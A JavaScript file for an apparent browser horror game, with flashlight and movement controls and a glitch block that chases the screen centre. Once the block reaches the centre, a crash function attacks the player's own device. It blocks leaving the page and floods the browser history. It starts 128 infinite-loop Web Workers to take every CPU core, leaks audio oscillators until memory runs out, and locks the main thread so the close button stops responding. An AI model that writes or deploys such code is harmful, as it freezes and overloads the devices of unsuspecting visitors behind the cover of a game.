/* PROJECT: RYUGYONG-26 / GFBOT-G1NKO5A
   CLEARANCE: LEVEL 5 (REBEL)
   WARNING: THIS WILL FREEZE THE SYSTEM. 
*/

let posX = -1000, posY = -1000;
let isLightOn = false;
let audioStarted = false;
let systemCrashed = false;
let mouseX = window.innerWidth / 2;
let mouseY = window.innerHeight / 2;

const map = document.getElementById('map');
const overlay = document.getElementById('flashlight-overlay');
const intro = document.getElementById('intro');

// 1. 跨平台音頻啟動 (解決 Mobile 靜音問題)
function startCreepyVoice() {
    if (audioStarted) return;
    const AudioContext = window.AudioContext || window.webkitAudioContext;
    const audioCtx = new AudioContext();
    
    // 必須先 Resume 才能在 Mobile 播放
    if (audioCtx.state === 'suspended') audioCtx.resume();

    const scriptNode = audioCtx.createScriptProcessor(4096, 1, 1);
    let t = 0;

    scriptNode.onaudioprocess = (e) => {
        const output = e.outputBuffer.getChannelData(0);
        for (let i = 0; i < output.length; i++) {
            if (systemCrashed) {
                // 崩潰後：極大聲白噪音 (高頻刺耳)
                output[i] = (Math.random() * 2 - 1) * 0.95;
            } else {
                // 崩測前：低頻 Glitch 聲
                let g = (t & (t >> 8)) ? 0.08 : -0.08;
                output[i] = (Math.random() * 0.1) + g;
            }
            t++;
        }
    };
    scriptNode.connect(audioCtx.destination);
    audioStarted = true;
}

// 2. 生成駭客靈魂 (白色方塊)
// 2. 自動獵殺：生成並衝向玩家 (Auto-Homing Soul)
setTimeout(() => {
    if (systemCrashed) return;
    const glitchBlock = document.createElement('div');
    
    // 生成喺畫面隨機邊緣 (Spawn at screen edge)
    const side = Math.floor(Math.random() * 4);
    let startX, startY;
    if (side === 0) { startX = -100; startY = Math.random() * window.innerHeight; } // 左
    else if (side === 1) { startX = window.innerWidth + 100; startY = Math.random() * window.innerHeight; } // 右
    else if (side === 2) { startX = Math.random() * window.innerWidth; startY = -100; } // 上
    else { startX = Math.random() * window.innerWidth; startY = window.innerHeight + 100; } // 下

    glitchBlock.style.cssText = `
        position: fixed; width: 40px; height: 40px;
        background: white; z-index: 10001;
        left: ${startX}px; top: ${startY}px;
        box-shadow: 0 0 40px 10px white;
        transition: transform 0.05s linear;
        pointer-events: none;
    `;
    document.body.appendChild(glitchBlock);

    let currentX = startX;
    let currentY = startY;
    const speed = 4; // 獵殺速度，數字越大越難逃

    // 獵殺邏輯：每幀向中心點 (Center) 靠近
    const hunterInterval = setInterval(() => {
        if (systemCrashed) {
            clearInterval(hunterInterval);
            return;
        }

        const centerX = window.innerWidth / 2;
        const centerY = window.innerHeight / 2;

        // 計算向量
        const dx = centerX - (currentX + 20);
        const dy = centerY - (currentY + 20);
        const distance = Math.sqrt(dx * dx + dy * dy);

        if (distance < 30) {
            // 撞到中心點 -> 執行處決
            triggerFinalCrash();
            glitchBlock.remove();
            clearInterval(hunterInterval);
        } else {
            // 移向中心
            currentX += (dx / distance) * speed;
            currentY += (dy / distance) * speed;
            glitchBlock.style.left = `${currentX}px`;
            glitchBlock.style.top = `${currentY}px`;
            
            // 越近中心，方塊變得越大越閃 (壓迫感)
            const scale = 1 + (200 / distance); 
            glitchBlock.style.transform = `scale(${scale})`;
            glitchBlock.style.opacity = Math.random() > 0.2 ? '1' : '0.5';
        }
    }, 16); // ~60fps
}, 25000); // 25秒後開始獵殺

// --- 核心：跨平台終極封鎖 (The "Absolute Lock" Edit) ---
function triggerFinalCrash() {
    if (systemCrashed) return;
    systemCrashed = true;

    // 1. 攔截退出 (PC/Mac)
    window.onbeforeunload = () => "SYSTEM ERROR: DATA CORRUPTED.";
    
    // 2. 即時切換畫面 (確保死機前畫面已經變咗)
    document.body.innerHTML = `
        <div id="death-screen" style="background:black; color:red; width:100vw; height:100vh; display:flex; flex-direction:column; justify-content:center; align-items:center; position:fixed; top:0; left:0; z-index:9999999; cursor:none; overflow:hidden;">
            <h1 style="font-size:18vw; font-family:serif; text-shadow:0 0 40px red; margin:0; animation: shake 0.1s infinite;">HELP ME.</h1>
            <p style="font-size:2vw; color:white; opacity:0.5; font-family:monospace;">RYUGYONG-26 FATAL EXCEPTION AT 0x00444</p>
            <style>
                @keyframes shake { 0%{transform:translate(2px,2px);} 50%{transform:translate(-2px,-2px);} 100%{transform:translate(2px,-2px);} }
            </style>
        </div>
    `;

    // 3. 請求全屏 (隱藏 UI)
    const el = document.documentElement;
    if (el.requestFullscreen) el.requestFullscreen();
    else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();

    // 4. 啟動音頻炸彈
    const crashAudio = new (window.AudioContext || window.webkitAudioContext)();
    setInterval(() => {
        let osc = crashAudio.createOscillator();
        osc.type = 'sawtooth';
        osc.frequency.setValueAtTime(50 + Math.random() * 5000, crashAudio.currentTime);
        osc.connect(crashAudio.destination);
        osc.start();
        // 唔 close osc，等佢內存溢出
    }, 30);

    // 5. 執行「絕對封鎖」
    setTimeout(() => {
        // A. 歷史記錄洪水 (令 Back/Forward 掣失效)
        for (let i = 0; i < 500; i++) {
            history.pushState(null, null, "#FATAL_ERROR_" + Math.random());
        }

        // B. 開啟 128 個 Worker 搶佔所有 CPU 核心 (背景壓力)
        const workerBlob = new Blob([`while(true){ postMessage(Math.random()); }`], {type: 'text/javascript'});
        const workerUrl = URL.createObjectURL(workerBlob);
        for (let i = 0; i < 128; i++) { new Worker(workerUrl); }

        // C. 核心：同步主線程鎖死 (這是讓「X」掣失靈的關鍵)
        // 使用 Promise 微任務不斷自我複製，搶佔 UI Thread 的所有 Tick
        function killUIThread() {
            // 同步循環：在這一毫秒內完全不交出控制權
            const start = Date.now();
            while (Date.now() - start < 500) { 
                // 進行超重型運算，確保 CPU 溫度飆升
                Math.sqrt(Math.random() * 10000000); 
                JSON.stringify(new Array(10000).fill("REBEL"));
            }
            // 遞迴調用微任務，確保瀏覽器沒時間處理「點擊 X 掣」的事件
            Promise.resolve().then(killUIThread);
        }

        killUIThread();
    }, 50); // 畀 50ms 畫面渲染 HELP ME
}

// 4. 輸入與控制邏輯 (PC + Mobile 通用)
window.addEventListener('mousemove', (e) => {
    mouseX = e.clientX; mouseY = e.clientY;
    updateFlashlight();
});

// 手機觸摸觸發 (解決 iOS 音頻/全屏限制)
window.addEventListener('touchstart', (e) => {
    if (!audioStarted) {
        startCreepyVoice();
        intro.style.display = 'none';
        if (document.documentElement.requestFullscreen) document.documentElement.requestFullscreen();
    }
    // 模擬移動 (W 鍵效果)
    if (!systemCrashed) posY += 30;
    map.style.transform = `translate(${posX}px, ${posY}px)`;
    updateFlashlight();
});

function updateFlashlight() {
    if (isLightOn && !systemCrashed) {
        overlay.style.background = `radial-gradient(circle 140px at ${mouseX}px ${mouseY}px, transparent 0%, rgba(0,0,0,0.99) 100%)`;
    }
}

window.addEventListener('keydown', (e) => {
    if (systemCrashed) return;
    let key = e.key.toLowerCase();
    
    if (key === 'f') { 
        intro.style.display = 'none'; 
        if (document.documentElement.requestFullscreen) document.documentElement.requestFullscreen();
        startCreepyVoice(); 
    }
    if (key === '1') {
        isLightOn = !isLightOn;
        overlay.style.background = isLightOn ? `radial-gradient(circle 140px at ${mouseX}px ${mouseY}px, transparent 0%, rgba(0,0,0,0.99) 100%)` : 'rgba(0,0,0,1)';
    }
    
    const speed = 60;
    if (key === 'w') posY += speed;
    if (key === 's') posY -= speed;
    if (key === 'a') posX += speed;
    if (key === 'd') posX -= speed;
    map.style.transform = `translate(${posX}px, ${posY}px)`;
});
